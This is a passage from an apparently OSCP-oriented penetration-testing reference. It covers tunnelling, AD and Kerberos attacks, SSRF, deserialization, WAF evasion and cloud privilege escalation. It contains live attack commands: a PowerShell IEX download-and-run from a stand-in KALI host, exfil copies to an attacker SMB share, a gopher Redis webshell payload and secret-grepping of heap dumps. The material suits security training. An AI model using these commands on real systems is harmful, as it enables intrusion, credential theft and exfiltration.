    ssh -D 1080 -N user@PIVOT               # SSH dynamic SOCKS on :1080
    # or chisel:  ./chisel client YOU:8080 R:socks     (see oscp atlas chisel)

## 3. Configure proxychains
Edit the conf file's [ProxyList]:
    # /opt/homebrew/etc/proxychains.conf
    [ProxyList]
    socks5 127.0.0.1 1080
Keep strict_chain (or use dynamic_chain to tolerate dead hops); enable **proxy_dns** so names
resolve through the tunnel. You can also keep a local copy and pass `-f ./proxychains.conf`.

## 4. CLI — only on Homebrew binaries (because of SIP)
Install the tool via brew so it lives in /opt/homebrew/bin (not SIP-protected):
    brew install nmap
    proxychains4 -q nmap -sT -Pn -p445,3389 10.10.20.5
    proxychains4 -q /opt/homebrew/bin/curl http://10.10.20.5/
`/usr/bin/curl` will NOT work (SIP). Always use the brew path. `nmap -sT -Pn` (TCP connect, no ping)
is required — proxychains is TCP-only (no ICMP/UDP).

## 5. Browser — don't use proxychains at all
Browsers speak SOCKS natively:
- **Firefox**: Settings -> Network Settings -> Manual proxy -> SOCKS v5, host 127.0.0.1 port 1080,
  tick "Proxy DNS when using SOCKS v5".
- **System-wide**: System Settings -> Network -> (interface) -> Details -> Proxies -> SOCKS proxy
  127.0.0.1:1080 (covers Safari/Chrome).
- **FoxyProxy** extension for quick on/off toggling.

## 6. Burp Suite — native SOCKS
Settings -> Network -> Connections -> SOCKS proxy: host 127.0.0.1, port 1080, tick "Use SOCKS
proxy" and "Do DNS lookups over SOCKS proxy". Now Burp (incl. Repeater/Intruder) reaches internal
web apps through the tunnel.

## The cleaner macOS alternative: a tun tunnel
Because of SIP, many people skip proxychains on macOS and use **ligolo-ng** (or tun2socks): it makes
a utun interface and you add a route, so **every** tool reaches the subnet natively — no library
injection, no SIP issue. (See: oscp atlas ligolo-ng.)

## Pattern
"brew install proxychains-ng -> point its conf at your SOCKS (ssh -D / chisel) -> run only Homebrew
binaries through it (SIP blocks system ones) -> use native SOCKS for the browser/Burp -> or skip it
and use ligolo-ng's tun." (See: proxychains, ssh-tunneling-patterns, pivoting-playbook.)

entries.title: Port forwarding & tunnelling — which technique, which command
entries.brief: A scenario -> technique -> exact command decision table across SSH / chisel / ligolo / socat / netsh
entries.body:
## The one question
"Which side can reach which?" decides the technique. This table goes straight from the scenario to
the command; the *why* is in the linked entries (ssh-tunneling-patterns, pivoting-playbook).

## Local forward (-L) — pull a remote port TO you
| Scenario | Command |
| --- | --- |
| Reach a port bound on the pivot (DB/admin on its localhost) | ssh -L 9000:127.0.0.1:3306 user@PIVOT -N |
| Reach an internal host *through* the pivot | ssh -L 9000:10.10.20.5:445 user@PIVOT -N |
Then connect to 127.0.0.1:9000 on your box.

## Remote forward (-R) — push YOUR port to them
| Scenario | Command |
| --- | --- |
| The target can only reach ME via the pivot | ssh -R 9001:127.0.0.1:9001 user@PIVOT -N |
| Catch a reverse shell from a deep host | listener on you + -R on the pivot |

## Dynamic / SOCKS (-D) — reach a WHOLE subnet
| Scenario | Command |
| --- | --- |
| Scan/reach an internal range (I have SSH) | ssh -D 1080 user@PIVOT -N  then  proxychains nmap -sT 10.10.20.0/24 |
| VPN-like, no proxychains | sshuttle -r user@PIVOT 10.10.20.0/24 |

## No SSH on the pivot? upload a tunnel binary
| Tool | Setup |
| --- | --- |
| chisel (SOCKS) | you: chisel server -p 8080 --reverse ; target: ./chisel client YOU:8080 R:socks |
| ligolo-ng tun | proxy -selfcert, agent -connect, then tunnel_start. nmap -sT --unprivileged, not -sS |
| ligolo-ng one port | listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp |
| socat (single port relay) | socat tcp-listen:8080,fork tcp:10.10.20.5:80 |

## Windows (built-in / no upload)
| Scenario | Command |
| --- | --- |
| Forward one port on a Windows host | netsh interface portproxy add v4tov4 listenport=L connectaddress=INT connectport=P |
| SSH tunnels from Windows | plink.exe -R ...   /   plink.exe -D 1080 ... |

## Pick by need (the quick router)
- **One port, I have SSH** -> -L (pull) or -R (push).
- **Whole subnet, I have SSH** -> -D + proxychains, or sshuttle (native).
- **No SSH, can upload a binary** -> chisel for SOCKS, ligolo-ng for a tun. ligolo listeners are the one-port form.
- **Single port, no SSH** -> socat; **Windows, no upload** -> netsh portproxy.
- **macOS attacker box** -> proxychains has a SIP caveat: see proxychains-macos (or use ligolo-ng).

## Pattern
"Decide by who-can-reach-who: one port = -L/-R; whole subnet = -D / sshuttle; no SSH = chisel /
ligolo-ng; Windows = netsh portproxy." (See: ssh-tunneling-patterns, proxychains-pivoting,
sshuttle-pivoting, windows-pivoting-netsh, pivoting-playbook, proxychains-macos.)

entries.title: Which tool, when, and why (vs its competitors)
entries.brief: use X not Y — speed vs depth, online vs offline, maintained vs legacy, + OSCP exam rules
entries.body:
## The idea
When two tools do the same job, know which to reach for and why. This is the "use X, not Y"
reference — by speed vs depth, online vs offline, maintained vs legacy — plus the OSCP exam rules.

## Recon / scanning
| Pick | over | why |
| --- | --- | --- |
| nmap | masscan, rustscan | deep service/OS/NSE profiling |
| masscan / rustscan | nmap -p- | raw speed on big ranges -> then nmap the open ports |

## Web content discovery
| Pick | over | why |
| --- | --- | --- |
| feroxbuster | gobuster, dirb, dirbuster | fast recursive async dir brute (default choice) |
| gobuster | — | non-recursive dirs, DNS subdomains, vhosts |
| ffuf | — | custom fuzzing: params, headers, API, FUZZ anywhere |
| (drop) dirb, dirbuster | — | slow / legacy |

## AD & SMB enumeration
| Pick | over | why |
| --- | --- | --- |
| nxc (netexec) | crackmapexec | nxc is the maintained fork; CME is deprecated |
| enum4linux-ng | enum4linux | rewritten, structured output |
| smbmap | — | quick READ/WRITE perms per share |
| smbclient | — | interactive file access |

## Web vuln / exploitation
| Pick | over | why |
| --- | --- | --- |
| nuclei | nikto | template CVEs across many hosts; nikto is noisy/legacy |
| sqlmap | manual | automated SQLi (exam: 1 target) |
| Burp (Community) | ZAP | the standard proxy; exam allows Community only |

## Passwords — the key distinction
**hydra/medusa = ONLINE** (brute a live service login: SSH/RDP/FTP/web). **john/hashcat = OFFLINE**
(crack captured hashes). Never brute a service with hashcat; never crack a hash with hydra.
| Pick | over | why |
| --- | --- | --- |
| hydra | medusa, ncrack | fast parallel ONLINE brute of live protocols |
| hashcat | john | OFFLINE + GPU: raw speed, big hash sets |
| john | hashcat | OFFLINE + files/keys: auto-detect + *2john (ssh/zip/keepass/pfx) |

## Foothold / exploit research
| Pick | over | why |
| --- | --- | --- |
| searchsploit | exploit-db web | offline Exploit-DB (exam-friendly) |
| metasploit | — | exam: 1 target only; prefer manual/custom scripts |

## Shells
| Pick | over | why |
| --- | --- | --- |
| nc | socat | quick listener to catch a shell |
| socat | nc | fully interactive TTY out of the box; TLS relays; port forwards |

## Privilege escalation
| Pick | over | why |
| --- | --- | --- |
| linpeas / winpeas (PEASS-ng) | LinEnum, PowerUp | run the moment you get a shell |
| GTFOBins / LOLBAS | — | the lookup for abusing a binary (sudo/suid; LOLBAS on Windows) |

## Pivoting
| Pick | over | why |
| --- | --- | --- |
| ligolo-ng | chisel + proxychains | true tun interface -> tools reach the subnet natively |
| chisel | — | simple SOCKS over HTTP through a tight firewall |
| plink.exe / netsh | — | Windows, no binary upload needed |

## AD paths & credential dumping
| Pick | over | why |
| --- | --- | --- |
| bloodhound(-python) | — | graph the fastest path to Domain Admin |
| mimikatz / pypykatz | — | LSASS creds/tickets (high priv; pypykatz parses dumps offline) |
| impacket (psexec/wmiexec/secretsdump) | nxc | low-level protocol scripts |

## Drop these (legacy)
dirb/dirbuster -> feroxbuster/ffuf · crackmapexec -> nxc · enum4linux -> enum4linux-ng ·
nikto -> nuclei (where possible) · PowerSploit (AMSI-blocked) -> Ghostpack/manual.

## OSCP exam rules (know them cold)
- **Metasploit / meterpreter: ONE target only**; no auto-exploit (autopwn / db_autopwn).
- **sqlmap: one target.**
- No commercial tools; **Burp Community** only.
- Responder-style poisoning is not used against exam hosts.
- Everything else listed here is allowed. Read your exam guide for the exact wording.

## Pattern
"Two tools, one job -> pick by speed vs depth, online vs offline, recursive vs custom, maintained
vs legacy — and obey the Metasploit/sqlmap one-target limits." (See: oscp-exam-strategy,
password-cracking-workflow, full-workflow, exam-vs-ctf-vs-real.)

entries.title: OSCP exam vs CTF/HTB vs real-world — strategy blueprints
entries.brief: Same tools, different priorities: speed/rules (exam) · creativity (CTF) · safety/risk (real)
entries.body:
## Three different games, same tools
The tools are the same; the priorities are not. Know which mindset you're in — it changes how fast,
how loud, and how creative you should be.

| Context | What matters most |
| --- | --- |
| OSCP exam | speed, time discipline, anti-rabbit-hole, strict rule compliance |
| CTF / HTB | pattern recognition, decompiling, recent CVEs/PoCs, rule mutations |
| Real-world | operational safety, low impact, system stability, business risk |

## 1. OSCP exam — speed, discipline, rules
- **Port triage**: two-phase nmap — fast `-p- --min-rate 5000` to map ports, then `-sCV` on only
  the open ones (see nmap use-cases).
- **Web**: feroxbuster with `--scan-limit 2 -d 2` so you don't get trapped in directory loops.
- **The 15-20 min rule**: timebox every lead; write it down and rotate targets.
- **Exploitation**: manual/custom scripts first; save your ONE allowed Metasploit use for a
  confident foothold.
- **Proof**: screenshot `whoami` + `ip`/`ipconfig` + the flag the instant you get each one.
- **Rules**: Metasploit & sqlmap one target each; Burp Community only. (See: tool-selection.)

## 2. CTF / HTB — pattern recognition, novel vectors
- **Version -> CVE**: match the exact version to a public PoC (GitHub/Exploit-DB).
- **Web**: fuzz params/inputs aggressively (ffuf); read HTML comments, JS bundles, and `.git/`.
- **Cracking**: run rules immediately (`hashcat -r best64` / `john --rules`) — authors mutate
  dictionary words.
- **Fair game**: stego, encoding, and lateral puzzle-boxes that the exam avoids.

## 3. Real-world pentest — safety, stealth, risk
- **Never** aggressive rates on production (`-t 100`, `--min-rate 10000`) — you can crash services.
- **AD**: run `--pass-pol` (nxc) BEFORE any spray to avoid domain lockouts.
- **Exploit safety**: read public exploit code first — no `rm -rf`, no hardcoded callbacks.
- **Report**: frame business risk — high-value assets, data exposure, systemic misconfig.

## The through-line
"Exam = fast + disciplined + compliant. CTF = creative + research-heavy. Real-world = safe +
low-impact + risk-focused." (See: oscp-exam-strategy, report-writing, tool-selection, full-workflow.)

entries.title: Spring Boot Actuator exposure
entries.brief: How exposed /actuator endpoints leak secrets and can reach RCE
entries.body:
## The exposure
Spring Boot apps ship **Actuator** management endpoints under **/actuator** (older: root). When
exposed without auth they leak configuration, environment variables (creds!), heap dumps, and
sometimes allow code execution. A high-value, common finding on Java web apps.

## Find it
    curl -s http://TARGET/actuator | jq        # lists available endpoints
    # older versions: /env, /health, /metrics, /mappings at the root
Common juicy ones: /actuator/env, /actuator/health, /actuator/mappings, /actuator/heapdump,
/actuator/configprops, /actuator/threaddump, /actuator/httptrace (recent requests + tokens).

## Loot secrets
    curl -s http://TARGET/actuator/env | jq       # DB/cloud creds, API keys (sometimes masked)
    curl -s http://TARGET/actuator/heapdump -o heap.hprof   # then grep/extract secrets
    # mine the heap dump for passwords/tokens:
    strings heap.hprof | grep -iE 'password|secret|token|key'
httptrace/httpexchanges can reveal other users' session cookies from recent requests.

## Reach RCE (version-dependent)
- **/actuator/env + /refresh** (Spring Cloud): set a malicious property, then POST /refresh ->
  code load (the classic Spring Cloud SpEL/`spring.cloud.bootstrap` chains).
- **/actuator/gateway** (Spring Cloud Gateway, CVE-2022-22947): add a route with a SpEL filter ->
  RCE. - **/actuator/logfile** leaks paths; **jolokia** (/actuator/jolokia) can invoke MBeans
  (like JMX) -> RCE. (See: java-rmi-jmx, log4shell-jndi.)

## Pattern
"Find /actuator -> env/heapdump for creds -> httptrace for sessions -> version-matched RCE
(gateway/jolokia/env+refresh)." (See: java-web-rce, information-disclosure, ssti-logic.)

entries.title: Windows file transfer (getting tools onto the box)
entries.brief: The reliable ways to move files to/from a Windows target, incl. LOLBAS
entries.body:
## The problem
Windows rarely has wget/nc. Use PowerShell, built-in LOLBAS binaries, or an SMB share. Host the
file on Kali first (python3 -m http.server 80 / impacket-smbserver).

## PowerShell (most common)
    powershell -c "Invoke-WebRequest -Uri http://KALI/nc.exe -OutFile C:\Windows\Temp\nc.exe"
    powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI/x.exe','C:\Temp\x.exe')"
    # fileless (run in memory):
    powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')"

## certutil (LOLBAS)
    certutil -urlcache -split -f http://KALI/x.exe C:\Temp\x.exe      # download
    certutil -encode in.exe out.b64  /  -decode out.b64 in.exe         # base64 on-host
Flagged by AV sometimes, but a dependable fallback.

## SMB (fast, and catches hashes)
    # on Kali:  impacket-smbserver share . -smb2support
    copy \\KALI\share\x.exe C:\Temp\      # on the target
    # exfil back:  copy loot.zip \\KALI\share\

## Other LOLBAS / fallbacks
    bitsadmin /transfer j http://KALI/x.exe C:\Temp\x.exe
    curl.exe http://KALI/x.exe -o C:\Temp\x.exe      # curl ships on modern Windows
    # tiny files: base64 on Kali -> paste -> certutil -decode on target

## Pattern
"Host on Kali (http.server / smbserver) -> pull with PowerShell IWR (or fileless IEX), else
certutil/bitsadmin/curl.exe, else an SMB copy." (See: file-transfer, windows-shells.)

entries.title: First commands by port (triage quick-ref)
entries.brief: See a port -> run these first; a fast lookup from the service scan
entries.body:

## Pattern
"Port -> this row's first commands -> if it bites, open the matching attack-* plan." (See:
recon-walkthrough, full-workflow, and the attack-* methods.)

entries.title: SSRF to internal services (gopher / redis / smuggling)
entries.brief: Turning a basic SSRF into internal RCE via gopher:// and protocol tricks
entries.body:
## Beyond fetching a URL
A basic SSRF reads a page; the real impact is reaching **internal services** and sending them
**crafted protocol bytes**. The `gopher://` scheme lets you send arbitrary TCP payloads — turning
SSRF into interaction with Redis, memcached, internal HTTP APIs, even SMTP.

## Schemes to try
- **gopher://** — send raw bytes to any TCP port (the big one). URL-encode CRLFs as %0d%0a.
- **file://** — read local files (file:///etc/passwd).
- **dict://** — probe/banner-grab services (dict://host:port/).
- **http://localhost:PORT** — reach admin panels bound to loopback.

## gopher -> Redis RCE (classic)
Send Redis commands over gopher to write a webshell or SSH key (see redis-exploitation):
    gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a...%0d%0aSAVE
Build these with **Gopherus** (gopherus --exploit redis) — it generates the payload for Redis,
MySQL, FastCGI, SMTP, etc.

## Cloud metadata (the other big win)
Point the SSRF at 169.254.169.254 to steal cloud creds (see cloud-metadata-ssrf).

## Filter bypasses
Decimal/hex IPs (http://2130706433/), [::], @-tricks, DNS rebinding, redirects to an internal
host. Confirm blind SSRF with an OOB callback (oscp atlas interactsh-client).

## Pattern
"SSRF -> try gopher/file/dict + localhost -> gopher to Redis/FastCGI (Gopherus) for RCE, or hit
cloud metadata -> bypass filters with alt IP encodings." (See: ssrf-logic, redis-exploitation,
cloud-metadata-ssrf.)

entries.title: Cracking strategy — rules, masks & wordlists
entries.brief: How to actually crack hashes efficiently: the order and the knobs
entries.body:
## The order that wins
1. **Straight wordlist** (rockyou) — fast, catches the obvious.
2. **Wordlist + rules** — the highest-yield step; mutate dictionary words.
3. **Targeted wordlist** (cewl/cupp from the target) + rules.
4. **Mask / hybrid** — structured brute for known patterns.
5. **Pure brute (mask)** — last resort, short lengths only.

## Rules (the 80% step)
    hashcat -m <mode> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    hashcat ... -r /usr/share/hashcat/rules/rockyou-30000.rule     # bigger
    # the famous heavy one:  OneRuleToRuleThemAll.rule
    john --rules --wordlist=rockyou.txt hash.txt                   # John's native rules
Rules apply capitalization, leet, appended digits/symbols — exactly how people pick passwords.

## Masks (hashcat -a3) — charsets
?l lower  ?u upper  ?d digit  ?s symbol  ?a all  (define custom with -1/-2)
    hashcat -m 0 hash -a3 ?u?l?l?l?l?d?d?d        # Ulllddd (e.g. Admin123)
    hashcat -m 0 hash -a3 -1 ?l?d ?1?1?1?1?1?1    # 6 chars of lower+digit

## Hybrid (combine wordlist + mask)
    hashcat -m 0 hash -a6 rockyou.txt ?d?d?d?d    # word + 4 digits (Summer2024)
    hashcat -m 0 hash -a7 ?d?d?d?d rockyou.txt    # digits + word

## Which tool
**hashcat** = GPU speed, big sets. **john** = standalone files/keys + auto-detect + *2john. See
tool-selection. Identify the hash first (hashid / name-that-hash) to pick the right -m.

## Pattern
"wordlist -> wordlist+rules (best64/OneRule) -> target-specific list -> hybrid -> mask. Pick
hashcat (GPU) or john (files), and ID the hash first." (See: password-cracking-workflow,
hashes-and-formats, tool-selection.)

entries.title: Impacket cheat-sheet — which script for what
entries.brief: A lookup from the task to the right impacket tool
entries.body:
## The idea
Impacket is a suite of focused Python scripts for Windows protocols. This maps the task to the
tool; each has a full atlas entry (oscp atlas impacket-<name>).

| Task | Tool |
| --- | --- |
| Run a command as admin (SYSTEM) | psexec / wmiexec / smbexec / atexec / dcomexec |
| Dump SAM/LSA/cached, or DCSync | secretsdump (-just-dc for the domain) |
| Kerberoast (SPN hashes) | GetUserSPNs -request |
| AS-REP roast (no-preauth) | GetNPUsers |
| Enumerate AD users | GetADUsers / samrdump |
| RID-cycle names (no LDAP) | lookupsid |
| S4U / constrained-deleg ticket | getST |
| Request a TGT | getTGT |
| Forge golden/silver ticket | ticketer |
| Create a computer (RBCD) | addcomputer |
| Write RBCD on a target | rbcd |
| Read/modify a DACL | dacledit (WriteDacl) |
| Take object ownership | owneredit (WriteOwner) |
| Change/reset a password | changepasswd |
| Enumerate delegation | findDelegation |
| NTLM relay | ntlmrelayx |
| MSSQL client | mssqlclient |
| Host an SMB share / catch auth | smbserver |
| Decrypt DPAPI | dpapi |
| Remote registry | reg |

## Auth is the same everywhere
password `DOM/user:pass@host` · hash `-hashes :NT` · Kerberos `-k -no-pass` (set KRB5CCNAME).

## Pattern
"Pick the script by the task above; auth with pass / -hashes / -k." (See: ad-acl-edges,
kerberos-attacks-map, tool-selection.)

entries.title: Kerberos attacks — what you have -> what you do
entries.brief: A decision map across AS-REP, Kerberoast, delegation, and ticket forging
entries.body:
## The map
Kerberos attacks branch on what you currently hold. Find your row.

| You have | Attack | Tool |
| --- | --- | --- |
| just a user list (no creds) | AS-REP roast (no-preauth accounts) | GetNPUsers -no-pass |
| any valid domain creds | Kerberoast (SPN accounts) | GetUserSPNs -request |
| write over a user (no SPN) | targeted Kerberoast (add SPN, roast) | targetedKerberoast / bloodyAD |
| write over a user/computer | shadow credentials -> their hash | pywhisker + certipy |
| write over a computer | RBCD -> impersonate | addcomputer + rbcd + getST |
| the krbtgt hash | golden ticket (whole domain) | ticketer / mimikatz |
| a service/machine hash | silver ticket (one service) | ticketer |
| a cert (pfx) | PKINIT auth -> TGT + NT hash | certipy auth |
| constrained delegation on an acct | S4U impersonate | getST -impersonate |
| unconstrained-deleg host | coerce a DC -> capture its TGT | coercer + krbrelayx |
| child-domain krbtgt | forest escalation (extra-sid -519) | ticketer -extra-sid |

## Always first
Sync your clock to the DC (`sudo ntpdate DC`) — skew > 5 min breaks Kerberos. Enumerate users
with kerbrute / lookupsid before roasting.

## Pattern
"Match what you hold to the row -> run that tool -> crack (13100/18200) or use the ticket."
(See: asreproasting, kerberoasting-deep, targeted-kerberoast, rbcd-attack, golden-silver-tickets,
kerberos-delegation, impacket-cheatsheet.)

## Where on the exchange
The picture of AS-REQ through AP-REQ, including diamond and sapphire, is `oscp technique show kerberos-flow`.

entries.title: ADCS newer ESCs (ESC9/ESC11/ESC13)
entries.brief: The post-2022 certificate-template abuses beyond ESC1-ESC8
entries.body:
## Context
Beyond the classic ESC1-ESC8 (adcs-esc-attacks), newer misconfigurations appear on modern,
partially-patched environments. Certipy flags them with `find -vulnerable`.

## The newer ones
- **ESC9 — no security extension**: a template with msPKI-Enrollment-Flag NO_SECURITY_EXTENSION
  omits the SID binding, so, combined with a writable `userPrincipalName`, you enroll a cert that
  authenticates as another user (even on patched DCs).
    certipy account update -user victim -upn administrator ; certipy req ... ; certipy auth ...
- **ESC10 — weak cert mapping**: registry mapping flags let a UPN-spoofed cert map to a privileged
  account (schannel/UPN mapping).
- **ESC11 — relay to ICPR (RPC)**: the CA's RPC enrollment lacks packet integrity -> relay a
  coerced machine to it (like ESC8 but over RPC). certipy relay -target rpc://CA.
- **ESC13 — issuance policy -> group**: a template's issuance policy is linked to a privileged
  group via an OID group link, so enrolling grants that group's rights.

## Approach
    certipy find -u user@corp -p pass -dc-ip DC -vulnerable -stdout     # names the ESC
Match the ESC, follow certipy's flow (update attr -> req -> auth), then use the pfx (adcs-esc-attacks).

## Pattern
"certipy find -vulnerable -> ESC9/10 (UPN spoof + weak mapping), ESC11 (relay to RPC), ESC13
(issuance-policy group) -> request a cert as a privileged identity -> auth." (See:
adcs-esc-attacks, adcs-certificate-theft, coercion-ntlm-relay.)

entries.title: Active Directory — no creds to Domain Admin (walkthrough)
entries.brief: The end-to-end AD chain, with the entry/tool for each step
entries.body:
## The chain
Most AD compromises follow the same arc. Each stage links to its detailed entry.

## 1. No creds -> a first credential
- Enumerate anonymously: null/guest SMB, anonymous LDAP, RID cycling (ad-enum-without-creds).
- Build a user list (nxc --rid-brute, kerbrute userenum, lookupsid).
- **AS-REP roast** the list with no password (GetNPUsers) -> crack (-m 18200).
- Poison + capture on the wire (Responder -> NetNTLMv2 -m 5600) where in scope.

## 2. First credential -> enumerate the domain
- Run BloodHound (bloodhound-python -c All) and mark owned (ad-enum-with-creds).
- **Kerberoast** (GetUserSPNs -request) -> crack service accounts (-m 13100).
- Read shares for secrets (smb-share-looting), check the password policy (--pass-pol).

## 3. Move laterally / escalate privilege
- Reuse creds everywhere (credential-reuse-strategy); PtH where you have a hash.
- Abuse a BloodHound ACL edge (ad-acl-edges): ForceChangePassword, shadow creds, RBCD,
  WriteDacl->DCSync, AddMember.
- Delegation (kerberos-delegation / getST), coercion + relay (coercion-ntlm-relay), ADCS
  (adcs-esc-attacks), or a CVE (zerologon, nopac, printnightmare).

## 4. Domain dominance
- **DCSync** every hash (secretsdump -just-dc), grab **krbtgt** -> golden ticket.
- psexec/wmiexec as Administrator on the DC; loot NTDS.

## The mental model
"enumerate (no creds) -> roast/capture a credential -> BloodHound the path -> abuse the edge
(ACL/delegation/ADCS/CVE) -> DCSync -> golden ticket." (See: ad-killchain, kerberos-attacks-map,
ad-acl-edges, dcsync-dcshadow.)

entries.title: AD enumeration with a domain credential (checklist)
entries.brief: What to run the moment you hold any valid domain account
entries.body:
## The first pass with creds
A single domain user unlocks the whole directory. Run these to map it before attacking.

## Map it
    bloodhound-python -d corp.local -u u -p p -c All -ns DC --zip     # the attack graph
    nxc smb <subnet> -u u -p p                                         # where am I admin?
    nxc smb DC -u u -p p --users --groups --pass-pol --loggedon-users
    ldapdomaindump -u 'corp\\u' -p p DC-IP                           # HTML of users/groups

## Find the quick wins
    impacket-GetUserSPNs corp.local/u:p -dc-ip DC -request            # kerberoast
    impacket-GetNPUsers corp.local/u:p -dc-ip DC -request             # AS-REP roast
    nxc ldap DC -u u -p p --kerberoasting out.txt --asreproast out2.txt
    ldapsearch ... '(objectClass=user)' description | grep -i pass     # creds in descriptions
    nxc smb <targets> -u u -p p --shares   (then smb-share-looting)

## Check for paths
- BloodHound: 'Shortest paths to Domain Admins', outbound edges from owned.
- Delegation: impacket-findDelegation / windapsearch --unconstrained-users.
- ADCS: certipy find -vulnerable. LAPS/gMSA you can read (gmsa-laps-reading).

## Pattern
"BloodHound + nxc spray-for-admin -> roast (SPN + AS-REP) -> loot shares/descriptions -> find an
ACL/delegation/ADCS path." (See: ad-full-walkthrough, bloodhound-queries, ad-acl-edges.)

entries.title: Authentication coercion (PetitPotam, PrinterBug, DFSCoerce)
entries.brief: Forcing a Windows host (often a DC) to authenticate to you
entries.body:
## Why coerce
Many AD attacks need a victim to **authenticate to you** — to capture its NetNTLM, relay it, or
catch a TGT (unconstrained delegation). Coercion RPC methods force that connection, usually from a
high-value target like a Domain Controller.

## The techniques (all force an outbound auth)
- **PetitPotam** (MS-EFSRPC): `petitpotam.py <ATTACKER> <DC>` — the classic, often unauthenticated.
- **PrinterBug / SpoolSample** (MS-RPRN print spooler): `printerbug.py corp/u:p@DC <ATTACKER>`.
- **DFSCoerce** (MS-DFSNM) and **ShadowCoerce** (MS-FSRVP) — alternatives when the above are patched.
- **Coercer** sprays them all: `coercer coerce -t DC -u u -p p -l <ATTACKER>` (oscp atlas coercer).

## What to pair it with
- **Capture**: run responder -> crack the NetNTLMv2 (can't PtH it).
- **Relay**: ntlmrelayx to LDAP(S) (--escalate-user / --delegate-access) or to ADCS web enrollment
  (ESC8) for a DC cert -> DCSync. (See: coercion-ntlm-relay, adcs-esc-attacks.)
- **Unconstrained delegation**: coerce a DC to a host you control -> capture its TGT (krbrelayx).

## Pattern
"Pick a trigger (PetitPotam/PrinterBug/DFSCoerce, or Coercer to spray) -> point it at a DC -> catch
with responder (crack) or relay with ntlmrelayx (LDAP/ADCS) -> domain impact." (See:
coercion-ntlm-relay, rbcd-attack, kerberos-delegation.)

entries.title: Insecure deserialization — detect & exploit map
entries.brief: A per-language lookup: spot the serialized data, pick the tool
entries.body:
## The idea
Deserializing attacker-controlled data is RCE in many stacks. Identify the format, then use the
right gadget tool. Each language has a full entry; this is the quick map.

| Language | Tell / magic | Tool | Entry |
| --- | --- | --- | --- |
| Java | AC ED 00 05 / base64 rO0AB | ysoserial (URLDNS to confirm) | java-deserialization |
| PHP | O:4:"User": / phar:// | phpggc (POP chains / phar) | php-deserialization-phar |
| .NET | __VIEWSTATE / AAEAAAD | ysoserial.net (+ machineKey) | dotnet-deserialization |
| Python | gASV / \x80\x04 (pickle); yaml.load | craft __reduce__ / !!python/apply | python-deserialization |
| Node | _$$ND_FUNC$$_ (node-serialize) | craft IIFE payload | nodejs-rce |

## Where to look
Cookies, hidden fields, `__VIEWSTATE`, JWT-adjacent blobs, caches, message queues, RMI/JMX/T3
ports, any `Content-Type: application/x-java-serialized-object` or octet-stream body, file uploads
processed by a deserializer (phar/pickle).

## Confirm before firing
Use a no-RCE probe first: Java **URLDNS** chain (DNS callback), or an OOB callback
(oscp atlas interactsh-client). Then pick the RCE gadget that matches the loaded library.

## Pattern
"Spot the serialized blob (magic bytes) -> identify the language -> confirm with URLDNS/OOB ->
ysoserial / phpggc / ysoserial.net / pickle gadget." (See the per-language entries above.)

entries.title: WAF / filter evasion (general)
entries.brief: Getting a blocked payload through, beyond just SQLi
entries.body:
## When a payload is blocked, not fixed
A 403 / 'malicious request' usually means a WAF matched a signature — the bug may still be there.
Fingerprint the WAF (oscp atlas wafw00f), then reshape the payload so it's equivalent but doesn't
match. (SQLi-specific tricks: sqli-waf-bypass.)

## General techniques
- **Case & whitespace**: mix case; swap spaces for tabs (%09), newlines (%0a), /**/ or + .
- **Encoding layers**: URL, double-URL (%2527), unicode/overlong, HTML entities, hex/char().
- **Content-Type / parsing gaps**: switch to `application/json` or `multipart`; add a charset;
  send the param in the body vs query; use a different HTTP method (verb tampering).
- **Parameter pollution**: send the param twice; the WAF and app may disagree on which wins.
- **Chunked / size**: Transfer-Encoding: chunked; pad the body so the WAF stops inspecting.
- **Null bytes / comments** inside keywords; break tokens with inert sequences.
- **Reach the origin**: find the real IP (DNS history, SSRF) to bypass a cloud WAF entirely.

## Method
1. Confirm the bug fires with a benign probe. 2. Binary-search which token trips the WAF. 3. Rewrite
just that token. 4. Automate with sqlmap `--tamper` / a Burp match-replace.

## Pattern
"403 != patched. wafw00f -> find the blocked token -> re-encode / alt-syntax / content-type / HPP /
chunked, or hit the origin IP." (See: sqli-waf-bypass, http-verb-tampering, parameter-pollution.)

entries.title: File upload to RCE — the chains
entries.brief: Turning a file upload into code execution when a plain webshell is blocked
entries.body:
## Beyond 'upload shell.php'
When the obvious webshell upload is blocked, chain the upload with another weakness. First confirm
the server tech and the webroot. (Bypass basics: file-upload-bypass.)

## Extension & content bypasses
- Alt extensions: .phtml .php5 .php7 .pht (PHP); .asp;.jpg, .aspx, .cshtml (IIS/.NET); .jsp .jspx.
- Double extension (shell.php.jpg), trailing dot/space/null, case (.pHp).
- Fake the magic bytes / Content-Type (image header + PHP tag = polyglot).
- `.htaccess` upload (Apache): make a benign ext execute as PHP; `web.config` on IIS similarly.

## Chain with another bug
- **Upload + LFI**: upload a text file with PHP, then include it via an LFI (?page=../uploads/x.txt).
- **Upload + path traversal**: filename `../../x.php` writes outside the upload dir (into the webroot).
- **Upload + ZipSlip**: a crafted archive extracts a file to an arbitrary path.
- **Upload + phar**: upload a polyglot phar, trigger a file op on `phar://` (php-deserialization-phar).
- **SSRF/XXE via file**: SVG/XML uploads that the server parses (xxe-logic); DOCX/XLSX are zipped XML.
- **ImageMagick / ffmpeg** processing a crafted image -> RCE (version-dependent).

## Find where it landed
Read the response/headers for the stored path; fuzz /uploads/ (feroxbuster) if it's hidden.

## Pattern
"Blocked webshell? -> alt ext / polyglot / .htaccess, or chain: upload+LFI, upload+traversal,
phar, SVG-XXE, image-processing RCE -> find the path -> trigger." (See: file-upload-bypass,
lfi-rfi-logic, php-deserialization-phar.)

entries.title: Cloud IAM privilege escalation paths
entries.brief: The recurring misconfigurations that turn limited cloud access into admin
entries.body:
## The idea
Cloud privesc is usually an **IAM** problem, not an exploit: a role/user has one permission too
many. After you have any creds (cloud-metadata-ssrf / leaked keys), enumerate perms, then look for
these patterns. Tools: Pacu (AWS), ScoutSuite (audit), roadrecon/AzureHound (Azure).

## AWS
- **iam:PassRole + a compute create** (lambda/ec2/glue) -> run as a more-privileged role.
- **iam:CreatePolicyVersion / SetDefaultPolicyVersion** -> grant yourself admin.
- **iam:AttachUserPolicy / PutUserPolicy** -> attach AdministratorAccess.
- **sts:AssumeRole** on a role you shouldn't; **lambda:UpdateFunctionCode** on a privileged function.
